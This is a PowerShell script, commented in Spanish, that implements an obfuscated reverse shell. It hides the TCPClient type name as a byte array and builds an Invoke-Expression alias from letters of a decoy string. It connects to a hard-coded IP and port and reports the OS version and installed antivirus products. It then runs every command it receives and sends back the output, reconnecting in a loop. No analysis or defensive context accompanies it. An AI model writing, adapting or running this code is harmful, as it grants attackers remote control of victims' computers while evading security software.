function ConvertFrom-ByteArray {
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Byte[]]
        $ByteArray,

        [Parameter(Position = 1)]
        [ValidateSet('ASCII', 'UTF8', 'UTF16', 'UTF32')]
        [String]
        $Encoding = 'UTF8'
    )

    if (!$ByteArray) {
        return ''
    }

    [System.Text.Encoding]::GetEncoding($($Encoding -replace 'UTF','UTF-')).GetString($ByteArray)
}

# Solicitar IP y Puerto al usuario
$ip = '192.168.0.10'
$puerto = '1234'

# Validar que el puerto sea un número válido
if (-not [int]::TryParse($puerto, [ref]$null)) {
    Write-Host "El puerto ingresado no es válido. Debe ser un número."
    exit
}

while ($true) {
    $Base64 = [Convert]::ToBase64String((1..32 | %{[byte](Get-Random -Minimum 0 -Maximum 255)}))
    $Key = ([Convert]::FromBase64String($Base64))
    $System = (Get-CimInstance CIM_OperatingSystem).Caption
    $Version = (Get-CimInstance CIM_OperatingSystem).Version
    $Architecture = (Get-CimInstance CIM_OperatingSystem).OSArchitecture

    $WindowsDirectory = (Get-CimInstance CIM_OperatingSystem).WindowsDirectory
    $av = (Get-CimInstance -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname

    $p = $ip

    $w = "System: $System`r`nVERSION: $Version`r`nARCH: $Architecture`r`nDIRECTORY: $WindowsDirectory`r`nAVS: $av`r`nGET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
    $s = New-Object System.Text.ASCIIEncoding
    [byte[]]$b = 0..65535 | % {0}
    $FIFA = ConvertFrom-ByteArray @(83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116)
    $r = "comoestorganizadoelconjuntodeobjetosgeogrficosdelterritorioDistritalenreasurbanasyruralesm-aljghipdfejfdxasf"
    Set-Alias $r ($r[$true-13] + ($r[[byte]("0x" + "FF") -263]) + $r[[byte]("0x" + "9a") -158])
    if ($FIFA -ne $null) {
        $y = New-Object $FIFA($p, [int]$puerto)
        $z = $y.GetStream()
        $d = $s.GetBytes($w)
        $z.Write($d, 0, $d.Length)
        $LEGOLAS = "whoami"
        $t = (comoestorganizadoelconjuntodeobjetosgeogrficosdelterritorioDistritalenreasurbanasyruralesm-aljghipdfejfdxasf $LEGOLAS) + "@root===> "
        while (($l = $z.Read($b, 0, $b.Length)) -ne 0) {
            $v = (New-Object -TypeName $s).GetString($b, 0, $l)
            $d = $s::UTF8.GetBytes((comoestorganizadoelconjuntodeobjetosgeogrficosdelterritorioDistritalenreasurbanasyruralesm-aljghipdfejfdxasf $v 2>&1 | Out-String)) + $s::UTF8.GetBytes($t)
            $z.Write($d, 0, $d.Length)
        }
        $y.Close()
        Start-Sleep -Seconds 7
    }
}

